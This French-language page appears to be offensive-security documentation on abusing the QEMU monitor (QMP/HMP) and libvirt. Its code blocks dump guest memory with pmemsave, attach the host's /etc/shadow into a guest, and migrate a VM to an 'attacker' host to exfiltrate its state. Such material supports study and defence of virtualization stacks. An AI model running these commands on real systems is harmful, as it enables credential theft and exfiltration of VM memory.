---
order: 3
title: "Plan de gestion : contrôler une VM QEMU via QMP, HMP et libvirt"
description: "Un QEMU en cours d'exécution expose un moniteur, le QEMU Machine Protocol (QMP) et le moniteur humain (HMP), capable de lire la mémoire de l'invité, d'attacher des périphériques et des disques, de migrer la VM et d'exécuter des commandes affectant l'hôte. Atteindre un socket de moniteur, ou l'API libvirt qui lui sert de façade, donne le contrôle sur la VM et, via des fonctionnalités comme la migration et l'attachement de disque, sur les ressources de l'hôte."
keywords:
  - qmp
  - hmp
  - qemu monitor
  - libvirt
  - migration
---

# Plan de gestion

Un processus QEMU en cours d'exécution expose une interface de contrôle, le QEMU Machine Protocol (QMP, JSON sur un socket) et le Human Monitor (HMP), généralement sur un socket Unix géré par libvirt. Le moniteur est puissant par conception : il peut lire et écrire la mémoire de l'invité, brancher à chaud des périphériques et des disques, prendre et charger des snapshots, changer de média, et migrer la VM vers un autre hôte. Atteindre un socket de moniteur, ou l'API libvirt qui lui sert de façade, équivaut donc au contrôle de la VM et à un levier sur les ressources de l'hôte, car plusieurs opérations du moniteur touchent des fichiers hôte et des endpoints réseau.

## Atteindre et piloter le moniteur

```bash
# libvirt-managed monitor sockets (host-side)
ls -l /var/lib/libvirt/qemu/domain-*/monitor.sock 2>/dev/null
# talk QMP: capabilities handshake, then commands
socat - UNIX-CONNECT:/var/lib/libvirt/qemu/domain-1-vm/monitor.sock
# {"execute":"qmp_capabilities"}
# {"execute":"human-monitor-command","arguments":{"command-line":"info registers"}}
# read guest memory, dump it, or attach a host disk/file to the guest:
# {"execute":"human-monitor-command","arguments":{"command-line":"pmemsave 0 0x100000 /tmp/g"}}
# via libvirt instead:
virsh qemu-monitor-command <dom> --hmp 'info block'
virsh attach-disk <dom> /etc/shadow vdz --config    # attach a host file into the guest
```

## Opérations affectant l'hôte

```bash
# migration can be directed to an attacker endpoint, exfiltrating VM state/memory
virsh migrate <dom> qemu+tcp://attacker/system      # VM state to attacker host
# blockdev/drive commands can open host files as guest disks; snapshot commands
# write to host paths; these turn monitor access into host file read/write
```

## Notes d'exploitation

- L'accès au moniteur équivaut à un contrôle quasi total de la VM : `pmemsave`/`memsave` dumpent la RAM de l'invité (secrets, clés), et le branchement à chaud de périphériques/disques plus le changement de média manipulent ce que l'invité et l'hôte s'exposent mutuellement.
- Plusieurs opérations atteignent l'hôte : attacher un fichier hôte comme disque invité lit les fichiers hôte dans l'invité, la migration envoie l'état de la VM vers un endpoint choisi, et les commandes snapshot/blockdev écrivent des chemins hôte.
- Le socket est généralement protégé par les permissions du système de fichiers sous libvirt ; l'atteindre signifie généralement un accès hôte déjà présent, mais il escalade alors le contrôle et peut pivoter via la migration et l'attachement de disque.
- Le `virsh qemu-monitor-command` de libvirt est la voie prise en charge vers la même interface lorsque vous avez un accès libvirt ; voir [Proxmox](../proxmox-ve/management-plane.md) et les autres produits qui superposent leur propre API par-dessus.

## Références

- [Référence QMP QEMU](https://www.qemu.org/docs/master/interop/qemu-qmp-ref.html)
- [API libvirt et virsh](https://libvirt.org/docs.html)
- [Documentation du moniteur QEMU](https://www.qemu.org/docs/master/system/monitor.html)
